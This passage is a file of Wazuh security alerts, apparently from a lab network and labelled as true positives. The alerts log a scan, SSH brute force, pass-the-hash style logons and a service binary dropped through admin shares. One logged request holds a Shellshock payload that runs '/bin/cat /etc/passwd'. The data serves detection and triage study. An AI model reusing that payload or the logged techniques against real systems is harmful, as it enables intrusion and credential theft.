"timestamp": "2025-07-08T19:19:49.379+0000"}, "fields": {"timestamp": ["2025-07-08T19:19:49.379Z"], "data.timestamp": ["2025-07-08T19:19:49.327Z"]}, "sort": [1752002389379]}}
{"id": "eV5665cBARIQcDql-GZ3", "description": "Shellshock attack detected", "label": "TP", "rule_level": 15, "rule_priority": "Critical", "alert": {"_index": "wazuh-alerts-4.x-2025.07.08", "_id": "eV5665cBARIQcDql-GZ3", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.9", "name": "Linux-Server", "id": "002"}, "manager": {"name": "wazuh-server"}, "data": {"protocol": "GET", "srcip": "10.0.2.8", "id": "200", "url": "/"}, "rule": {"firedtimes": 1, "mail": true, "pci_dss": ["11.4"], "tsc": ["CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "Shellshock attack detected", "groups": ["web", "accesslog", "attack"], "mitre": {"technique": ["Exploitation for Privilege Escalation", "Exploit Public-Facing Application"], "id": ["T1068", "T1190"], "tactic": ["Privilege Escalation", "Initial Access"]}, "id": "31168", "nist_800_53": ["SI.4"], "info": "CVE-2014-6271https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271", "gdpr": ["IV_35.7.d"]}, "location": "/var/log/apache2/access.log", "decoder": {"name": "web-accesslog"}, "id": "1752002389.3510039", "full_log": "10.0.2.8 - - [08/Jul/2025:19:19:49 +0000] \"GET / HTTP/1.1\" 200 10926 \"-\" \"() { :; }; /bin/cat /etc/passwd\"", "timestamp": "2025-07-08T19:19:49.698+0000"}, "fields": {"timestamp": ["2025-07-08T19:19:49.698Z"]}, "sort": [1752002389698]}}
{"id": "jV5-65cBARIQcDqlUGho", "description": "Maximum authentication attempts exceeded.", "label": "TP", "rule_level": 8, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.08", "_id": "jV5-65cBARIQcDqlUGho", "_score": null, "_source": {"predecoder": {"hostname": "Linux-Server", "program_name": "sshd", "timestamp": "Jul 08 19:23:30"}, "input": {"type": "log"}, "agent": {"ip": "10.0.2.9", "name": "Linux-Server", "id": "002"}, "manager": {"name": "wazuh-server"}, "rule": {"firedtimes": 42, "mail": false, "description": "Maximum authentication attempts exceeded.", "groups": ["syslog", "sshd", "authentication_failed"], "mitre": {"technique": ["Brute Force"], "id": ["T1110"], "tactic": ["Credential Access"]}, "id": "5758", "gpg13": ["7.1"]}, "location": "journald", "decoder": {"parent": "sshd", "name": "sshd"}, "id": "1752002611.3841815", "full_log": "Jul 08 19:23:30 Linux-Server sshd[2858]: error: maximum authentication attempts exceeded for invalid user top-usernames-shortlist.txt from 10.0.2.8 port 51034 ssh2 [preauth]", "timestamp": "2025-07-08T19:23:31.588+0000"}, "fields": {"timestamp": ["2025-07-08T19:23:31.588Z"]}, "sort": [1752002611588]}}
{"id": "Xl6X65cBARIQcDqlsmtk", "description": "Suricata: Alert - POSSBL PORT SCAN (NMAP -sS)", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.08", "_id": "Xl6X65cBARIQcDqlsmtk", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.6", "name": "Suricata", "id": "001"}, "manager": {"name": "wazuh-server"}, "data": {"in_iface": "enp0s3", "src_ip": "10.0.2.8", "src_port": "36739", "event_type": "alert", "alert": {"severity": "2", "signature_id": "3400002", "rev": "2", "gid": "1", "signature": "POSSBL PORT SCAN (NMAP -sS)", "action": "allowed", "category": "Attempted Information Leak"}, "flow_id": "263234863140450.000000", "dest_ip": "10.0.2.9", "proto": "TCP", "dest_port": "2043", "pkt_src": "wire/pcap", "flow": {"src_ip": "10.0.2.8", "src_port": "36739", "pkts_toserver": "1", "dest_ip": "10.0.2.9", "start": "2025-07-08T19:51:12.520041+0000", "bytes_toclient": "0", "bytes_toserver": "60", "pkts_toclient": "0", "dest_port": "2043"}, "timestamp": "2025-07-08T19:51:12.520041+0000", "direction": "to_server"}, "rule": {"firedtimes": 382, "mail": false, "description": "Suricata: Alert - POSSBL PORT SCAN (NMAP -sS)", "groups": ["ids", "suricata"], "id": "86601"}, "location": "/var/log/suricata/eve.json", "decoder": {"name": "json"}, "id": "1752004273.4541495", "timestamp": "2025-07-08T19:51:13.595+0000"}, "fields": {"timestamp": ["2025-07-08T19:51:13.595Z"], "data.timestamp": ["2025-07-08T19:51:12.520Z"]}, "sort": [1752004273595]}}
{"id": "kl6a65cBARIQcDqlzmvG", "description": "Successful Remote Logon Detected - User:\\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that KALI is allowed to perform RDP connections", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.08", "_id": "kl6a65cBARIQcDqlzmvG", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.12", "name": "WinSrv2019", "id": "004"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"subjectLogonId": "0x0", "targetLinkedLogonId": "0x0", "impersonationLevel": "%%1833", "ipAddress": "10.0.2.8", "authenticationPackageName": "NTLM", "workstationName": "KALI", "lmPackageName": "NTLM V1", "targetLogonId": "0x835f9", "logonProcessName": "NtLmSsp", "logonGuid": "{00000000-0000-0000-0000-000000000000}", "targetUserName": "ANONYMOUS LOGON", "keyLength": "128", "elevatedToken": "%%1843", "subjectUserSid": "S-1-0-0", "processId": "0x0", "ipPort": "41188", "targetDomainName": "SOCLAB", "targetUserSid": "S-1-5-7", "virtualAccount": "%%1843", "logonType": "3"}, "system": {"eventID": "4624", "keywords": "0x8020000000000000", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "level": "0", "channel": "Security", "opcode": "0", "message": "\"An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t3\r\n\tRestricted Admin Mode:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tNo\r\n\r\nImpersonation Level:\t\tImpersonation\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-7\r\n\tAccount Name:\t\tANONYMOUS LOGON\r\n\tAccount Domain:\t\tSOCLAB\r\n\tLogon ID:\t\t0x835F9\r\n\tLinked Logon ID:\t\t0x0\r\n\tNetwork Account Name:\t-\r\n\tNetwork Account Domain:\t-\r\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x0\r\n\tProcess Name:\t\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tKALI\r\n\tSource Network Address:\t10.0.2.8\r\n\tSource Port:\t\t41188\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\tNTLM V1\r\n\tKey Length:\t\t128\r\n\r\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\r\n\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\n\r\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\"", "version": "2", "systemTime": "2025-07-08T19:54:39.447587800Z", "eventRecordID": "42056", "threadID": "872", "computer": "WinSrv2019.soclab.internal", "task": "12544", "processID": "640", "severityValue": "AUDIT_SUCCESS", "providerName": "Microsoft-Windows-Security-Auditing"}}}, "rule": {"mail": false, "pci_dss": ["10.2.5"], "hipaa": ["164.312.b"], "tsc": ["CC6.8", "CC7.2", "CC7.3"], "description": "Successful Remote Logon Detected - User:\\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that KALI is allowed to perform RDP connections", "groups": ["win_evt_channel", "windows", "\n      authentication_success", "\n    "], "nist_800_53": ["AU.14", "AC.7"], "gdpr": ["IV_32.2"], "firedtimes": 1, "mitre": {"technique": ["Pass the Hash", "Domain Accounts", "Remote Desktop Protocol"], "id": ["T1550.002", "T1078.002", "T1021.001"], "tactic": ["Defense Evasion", "Lateral Movement", "Persistence", "Privilege Escalation", "Initial Access"]}, "id": "92657", "gpg13": ["7.1", "7.2"]}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1752004478.4794714", "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4624\",\"version\":\"2\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2025-07-08T19:54:39.447587800Z\",\"eventRecordID\":\"42056\",\"processID\":\"640\",\"threadID\":\"872\",\"channel\":\"Security\",\"computer\":\"WinSrv2019.soclab.internal\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"An account was successfully logged on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Information:\\r\\n\\tLogon Type:\\t\\t3\\r\\n\\tRestricted Admin Mode:\\t-\\r\\n\\tVirtual Account:\\t\\tNo\\r\\n\\tElevated Token:\\t\\tNo\\r\\n\\r\\nImpersonation Level:\\t\\tImpersonation\\r\\n\\r\\nNew Logon:\\r\\n\\tSecurity ID:\\t\\tS-1-5-7\\r\\n\\tAccount Name:\\t\\tANONYMOUS LOGON\\r\\n\\tAccount Domain:\\t\\tSOCLAB\\r\\n\\tLogon ID:\\t\\t0x835F9\\r\\n\\tLinked Logon ID:\\t\\t0x0\\r\\n\\tNetwork Account Name:\\t-\\r\\n\\tNetwork Account Domain:\\t-\\r\\n\\tLogon GUID:\\t\\t{00000000-0000-0000-0000-000000000000}\\r\\n\\r\\nProcess Information:\\r\\n\\tProcess ID:\\t\\t0x0\\r\\n\\tProcess Name:\\t\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\tKALI\\r\\n\\tSource Network Address:\\t10.0.2.8\\r\\n\\tSource Port:\\t\\t41188\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\tNTLM V1\\r\\n\\tKey Length:\\t\\t128\\r\\n\\r\\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\\r\\n\\r\\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\\r\\n\\r\\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-5-7\",\"targetUserName\":\"ANONYMOUS LOGON\",\"targetDomainName\":\"SOCLAB\",\"targetLogonId\":\"0x835f9\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"workstationName\":\"KALI\",\"logonGuid\":\"{00000000-0000-0000-0000-000000000000}\",\"lmPackageName\":\"NTLM V1\",\"keyLength\":\"128\",\"processId\":\"0x0\",\"ipAddress\":\"10.0.2.8\",\"ipPort\":\"41188\",\"impersonationLevel\":\"%%1833\",\"virtualAccount\":\"%%1843\",\"targetLinkedLogonId\":\"0x0\",\"elevatedToken\":\"%%1843\"}}}", "timestamp": "2025-07-08T19:54:38.788+0000"}, "fields": {"timestamp": ["2025-07-08T19:54:38.788Z"]}, "sort": [1752004478788]}}
{"id": "p16d65cBARIQcDqlbmu9", "description": "Logon Failure - Unknown user or bad password", "label": "TP", "rule_level": 5, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.08", "_id": "p16d65cBARIQcDqlbmu9", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.12", "name": "WinSrv2019", "id": "004"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"subjectLogonId": "0x0", "ipAddress": "10.0.2.8", "authenticationPackageName": "NTLM", "subStatus": "0xc0000064", "logonProcessName": "NtLmSsp", "targetUserName": "user", "keyLength": "0", "subjectUserSid": "S-1-0-0", "processId": "0x0", "ipPort": "37114", "failureReason": "%%2313", "targetUserSid": "S-1-0-0", "logonType": "3", "status": "0xc000006d"}, "system": {"eventID": "4625", "keywords": "0x8010000000000000", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "level": "0", "channel": "Security", "opcode": "0", "message": "\"An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\tuser\r\n\tAccount Domain:\t\t\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC0000064\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\t-\r\n\tSource Network Address:\t10.0.2.8\r\n\tSource Port:\t\t37114\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\t-\r\n\tKey Length:\t\t0\r\n\r\nThis event is generated when a logon request fails. It is generated on the computer where access was attempted.\r\n\r\nThe Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe Process Information fields indicate which account and process on the system requested the logon.\r\n\r\nThe Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\"", "version": "0", "systemTime": "2025-07-08T19:57:22.716797700Z", "eventRecordID": "42075", "threadID": "3852", "computer": "WinSrv2019.soclab.internal", "task": "12544", "processID": "640", "severityValue": "AUDIT_FAILURE", "providerName": "Microsoft-Windows-Security-Auditing"}}}, "rule": {"mail": false, "pci_dss": ["10.2.4", "10.2.5"], "hipaa": ["164.312.b"], "tsc": ["CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "Logon Failure - Unknown user or bad password", "groups": ["windows", "windows_security", "authentication_failed"], "nist_800_53": ["AU.14", "AC.7"], "gdpr": ["IV_35.7.d", "IV_32.2"], "firedtimes": 1, "mitre": {"technique": ["Account Access Removal"], "id": ["T1531"], "tactic": ["Impact"]}, "id": "60122", "gpg13": ["7.1"]}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1752004641.4879238", "timestamp": "2025-07-08T19:57:21.792+0000"}, "fields": {"timestamp": ["2025-07-08T19:57:21.792Z"]}, "sort": [1752004641792]}}
{"id": "t16e65cBARIQcDqlr2sh", "description": "New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.08", "_id": "t16e65cBARIQcDqlr2sh", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.12", "name": "WinSrv2019", "id": "004"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"serviceType": "user mode service", "accountName": "LocalSystem", "imagePath": "%systemroot%\\\\VInRVbCa.exe", "startType": "demand start", "serviceName": "tmca"}, "system": {"eventID": "7045", "eventSourceName": "Service Control Manager", "keywords": "0x8080000000000000", "providerGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "level": "4", "channel": "System", "opcode": "0", "message": "\"A service was installed in the system.\r\n\r\nService Name:  tmca\r\nService File Name:  %systemroot%\\VInRVbCa.exe\r\nService Type:  user mode service\r\nService Start Type:  demand start\r\nService Account:  LocalSystem\"", "version": "0", "systemTime": "2025-07-08T19:58:50.345334100Z", "eventRecordID": "2863", "threadID": "2472", "computer": "WinSrv2019.soclab.internal", "task": "0", "processID": "596", "severityValue": "INFORMATION", "providerName": "Service Control Manager"}}}, "rule": {"firedtimes": 1, "mail": true, "description": "New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.", "groups": ["win_evt_channel", "windows"], "mitre": {"technique": ["SMB/Windows Admin Shares", "Service Execution"], "id": ["T1021.002", "T1569.002"], "tactic": ["Lateral Movement", "Execution"]}, "id": "92650"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1752004728.4942080", "timestamp": "2025-07-08T19:58:48.585+0000"}, "fields": {"timestamp": ["2025-07-08T19:58:48.585Z"]}, "sort": [1752004728585]}}
{"id": "tF6e65cBARIQcDqlr2sh", "description": "Successful Remote Logon Detected - User:\\vboxuser - NTLM authentication, possible pass-the-hash attack.", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.08", "_id": "tF6e65cBARIQcDqlr2sh", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.12", "name": "WinSrv2019", "id": "004"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"subjectLogonId": "0x0", "targetLinkedLogonId": "0x0", "impersonationLevel": "%%1833", "ipAddress": "10.0.2.8", "authenticationPackageName": "NTLM", "lmPackageName": "NTLM V2", "targetLogonId": "0xa7d07", "logonProcessName": "NtLmSsp", "logonGuid": "{00000000-0000-0000-0000-000000000000}", "targetUserName": "vboxuser", "keyLength": "128", "elevatedToken": "%%1842", "subjectUserSid": "S-1-0-0", "processId": "0x0", "ipPort": "42048", "targetDomainName": "SOCLAB", "targetUserSid": "S-1-5-21-3023907177-3273552708-540821291-1000", "virtualAccount": "%%1843", "logonType": "3"}, "system": {"eventID": "4624", "keywords": "0x8020000000000000", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "level": "0", "channel": "Security", "opcode": "0", "message": "\"An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t3\r\n\tRestricted Admin Mode:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nImpersonation Level:\t\tImpersonation\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-21-3023907177-3273552708-540821291-1000\r\n\tAccount Name:\t\tvboxuser\r\n\tAccount Domain:\t\tSOCLAB\r\n\tLogon ID:\t\t0xA7D07\r\n\tLinked Logon ID:\t\t0x0\r\n\tNetwork Account Name:\t-\r\n\tNetwork Account Domain:\t-\r\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x0\r\n\tProcess Name:\t\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\t-\r\n\tSource Network Address:\t10.0.2.8\r\n\tSource Port:\t\t42048\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\tNTLM V2\r\n\tKey Length:\t\t128\r\n\r\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\r\n\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\n\r\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\"", "version": "2", "systemTime": "2025-07-08T19:58:47.179686200Z", "eventRecordID": "42090", "threadID": "2140", "computer": "WinSrv2019.soclab.internal", "task": "12544", "processID": "640", "severityValue": "AUDIT_SUCCESS", "providerName": "Microsoft-Windows-Security-Auditing"}}}, "rule": {"mail": false, "hipaa": ["164.312.b"], "pci_dss": ["10.2.5"], "tsc": ["CC6.8", "CC7.2", "CC7.3"], "description": "Successful Remote Logon Detected - User:\\vboxuser - NTLM authentication, possible pass-the-hash attack.", "groups": ["win_evt_channel", "windows", "authentication_success"], "nist_800_53": ["AC.7", "AU.14"], "gdpr": ["IV_32.2"], "firedtimes": 1, "mitre": {"technique": ["Pass the Hash", "Domain Accounts"], "id": ["T1550.002", "T1078.002"], "tactic": ["Defense Evasion", "Lateral Movement", "Persistence", "Privilege Escalation", "Initial Access"]}, "id": "92652", "gpg13": ["7.1", "7.2"]}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1752004726.4929564", "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4624\",\"version\":\"2\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2025-07-08T19:58:47.179686200Z\",\"eventRecordID\":\"42090\",\"processID\":\"640\",\"threadID\":\"2140\",\"channel\":\"Security\",\"computer\":\"WinSrv2019.soclab.internal\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"An account was successfully logged on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Information:\\r\\n\\tLogon Type:\\t\\t3\\r\\n\\tRestricted Admin Mode:\\t-\\r\\n\\tVirtual Account:\\t\\tNo\\r\\n\\tElevated Token:\\t\\tYes\\r\\n\\r\\nImpersonation Level:\\t\\tImpersonation\\r\\n\\r\\nNew Logon:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3023907177-3273552708-540821291-1000\\r\\n\\tAccount Name:\\t\\tvboxuser\\r\\n\\tAccount Domain:\\t\\tSOCLAB\\r\\n\\tLogon ID:\\t\\t0xA7D07\\r\\n\\tLinked Logon ID:\\t\\t0x0\\r\\n\\tNetwork Account Name:\\t-\\r\\n\\tNetwork Account Domain:\\t-\\r\\n\\tLogon GUID:\\t\\t{00000000-0000-0000-0000-000000000000}\\r\\n\\r\\nProcess Information:\\r\\n\\tProcess ID:\\t\\t0x0\\r\\n\\tProcess Name:\\t\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\t-\\r\\n\\tSource Network Address:\\t10.0.2.8\\r\\n\\tSource Port:\\t\\t42048\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\tNTLM V2\\r\\n\\tKey Length:\\t\\t128\\r\\n\\r\\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\\r\\n\\r\\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\\r\\n\\r\\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-5-21-3023907177-3273552708-540821291-1000\",\"targetUserName\":\"vboxuser\",\"targetDomainName\":\"SOCLAB\",\"targetLogonId\":\"0xa7d07\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"logonGuid\":\"{00000000-0000-0000-0000-000000000000}\",\"lmPackageName\":\"NTLM V2\",\"keyLength\":\"128\",\"processId\":\"0x0\",\"ipAddress\":\"10.0.2.8\",\"ipPort\":\"42048\",\"impersonationLevel\":\"%%1833\",\"virtualAccount\":\"%%1843\",\"targetLinkedLogonId\":\"0x0\",\"elevatedToken\":\"%%1842\"}}}", "timestamp": "2025-07-08T19:58:46.233+0000"}, "fields": {"timestamp": ["2025-07-08T19:58:46.233Z"]}, "sort": [1752004726233]}}
{"id": "tV6e65cBARIQcDqlr2sh", "description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.08", "_id": "tV6e65cBARIQcDqlr2sh", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.12", "name": "WinSrv2019", "id": "004"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"image": "System", "processGuid": "{6a97c67b-7728-686d-eb03-000000000000}", "processId": "4", "utcTime": "2025-07-08 19:58:47.267", "targetFilename": "C:\\\\Windows\\\\VInRVbCa.exe", "creationUtcTime": "2025-07-08 19:58:47.252", "user": "NT AUTHORITY\\\\SYSTEM"}, "system": {"eventID": "11", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"File created:\r\nRuleName: -\r\nUtcTime: 2025-07-08 19:58:47.267\r\nProcessGuid: {6a97c67b-7728-686d-eb03-000000000000}\r\nProcessId: 4\r\nImage: System\r\nTargetFilename: C:\\Windows\\VInRVbCa.exe\r\nCreationUtcTime: 2025-07-08 19:58:47.252\r\nUser: NT AUTHORITY\\SYSTEM\"", "version": "2", "systemTime": "2025-07-08T19:58:47.271530200Z", "eventRecordID": "25676", "threadID": "2668", "computer": "WinSrv2019.soclab.internal", "task": "11", "processID": "1164", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process", "groups": ["sysmon", "sysmon_eid11_detections", "windows"], "mitre": {"technique": ["Lateral Tool Transfer"], "id": ["T1570"], "tactic": ["Lateral Movement"]}, "id": "92218"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1752004726.4936906", "timestamp": "2025-07-08T19:58:46.353+0000"}, "fields": {"timestamp": ["2025-07-08T19:58:46.353Z"]}, "sort": [1752004726353]}}
